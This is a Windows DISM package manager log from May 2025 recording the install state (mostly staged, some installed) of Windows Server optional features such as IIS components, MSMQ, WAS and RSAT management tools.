2025-05-16 16:05:35, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-StaticContent with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:35, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-DefaultDocument with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:35, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-DirectoryBrowsing with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:35, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-HttpErrors with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:35, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-HttpRedirect with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:35, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-WebDAV with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:35, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-ApplicationDevelopment with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:35, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-WebSockets with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:35, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-ApplicationInit with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:35, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-NetFxExtensibility with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:35, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-NetFxExtensibility45 with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:35, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-ISAPIExtensions with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:35, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-ISAPIFilter with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:35, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-ASPNET with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:36, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-ASPNET45 with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:36, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-ASP with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:36, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-CGI with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:36, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-ServerSideIncludes with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:36, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-HealthAndDiagnostics with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:36, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-HttpLogging with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:36, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-LoggingLibraries with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:36, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-RequestMonitor with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:36, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-HttpTracing with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:36, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-CustomLogging with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:36, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-ODBCLogging with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:36, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-CertProvider with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:36, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-BasicAuthentication with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:36, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-WindowsAuthentication with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:36, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-DigestAuthentication with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:36, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-ClientCertificateMappingAuthentication with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:36, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-IISCertificateMappingAuthentication with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:36, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-URLAuthorization with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:36, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-IPSecurity with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:36, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-Performance with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:36, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-HttpCompressionStatic with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:36, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-HttpCompressionDynamic with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:36, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-WebServerManagementTools with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:37, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-ManagementConsole with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:37, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-LegacySnapIn with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:37, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-ManagementScriptingTools with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:37, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-ManagementService with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:37, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-IIS6ManagementCompatibility with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:37, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-Metabase with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:37, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-WMICompatibility with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:37, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-LegacyScripts with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:37, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-FTPServer with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:37, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-FTPSvc with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:37, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-FTPExtensibility with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:37, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature WAS-WindowsActivationService with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:37, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature WAS-ProcessModel with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:37, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature WAS-NetFxEnvironment with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:37, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature WAS-ConfigurationAPI with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:37, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-HostableWebCore with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:37, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature BITSExtensions-AdminPack with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:37, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Gateway-UI with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:37, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature BITSExtensions-Upload with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:37, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature WCF-HTTP-Activation with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:37, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature WCF-NonHTTP-Activation with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:37, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Smtpsvc-Admin-Update-Name with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:37, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Smtpsvc-Service-Update-Name with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:37, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature RPC-HTTP_Proxy with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:37, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Gateway with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:38, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature WorkFolders-Server with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:38, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature MSMQ with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:38, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature MSMQ-Services with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:38, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature MSMQ-DCOMProxy with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:38, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature MSMQ-Server with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:38, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature MSMQ-ADIntegration with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:38, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature MSMQ-HTTP with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:38, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature MSMQ-Multicast with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:38, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature MSMQ-Triggers with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:38, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature MSMQ-RoutingServer with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:38, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Microsoft-Windows-Web-Services-for-Management-IIS-Extension with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:38, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature DirectoryServices-ADAM with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:38, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature ServerCore-WOW64 with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:38, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Printing-Server-Foundation-Features with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:38, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Printing-Server-Role with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:38, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Printing-LPDPrintService with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:38, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Printing-Client with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:38, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Printing-Client-Gui with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:38, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature NetFx3ServerFeatures with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:38, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature NetFx3 with CBS state 2(CbsInstallStateResolved) being mapped to dism state 2(DISM_INSTALL_STATE_REMOVED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:38, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature MediaPlayback with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:38, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature WindowsMediaPlayer with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:38, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Printing-XPSServices-Features with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:39, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature TFTP with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:39, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature LegacyComponents with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:39, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature DirectPlay with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:39, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Windows-Identity-Foundation with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:39, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature MultiPoint-Connector with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:39, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature MultiPoint-Connector-Services with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:39, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature MultiPoint-Tools with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:39, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature FailoverCluster-AdminPak with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:39, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature HardenedFabricEncryptionTask with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:39, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature SimpleTCP with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:39, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature SmbDirect with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:39, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Windows-Defender with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:39, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature EnhancedStorage with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:39, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Server-Manager-RSAT-File-Services with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:39, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Server-RSAT-SNMP with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:39, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature WINS-Server-Tools with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:39, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature ADCertificateServicesManagementTools with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:39, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature CertificateServicesManagementTools with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:39, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature OnlineRevocationServicesManagementTools with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:39, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature BitLocker-RemoteAdminTool with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:39, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature BdeAducExtTool with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:39, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature NPSMMC with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:39, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature RSAT-RDS-Tools-Feature with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:39, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Licensing-UI with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:39, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Licensing-Diagnosis-UI with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:40, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Microsoft-Windows-Deployment-Services-Admin-Pack with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:40, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature DHCPServer-Tools with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:40, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature NetworkLoadBalancingManagementClient with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:40, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature WindowsServerBackupSnapin with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:40, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature NPSManagementTools with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
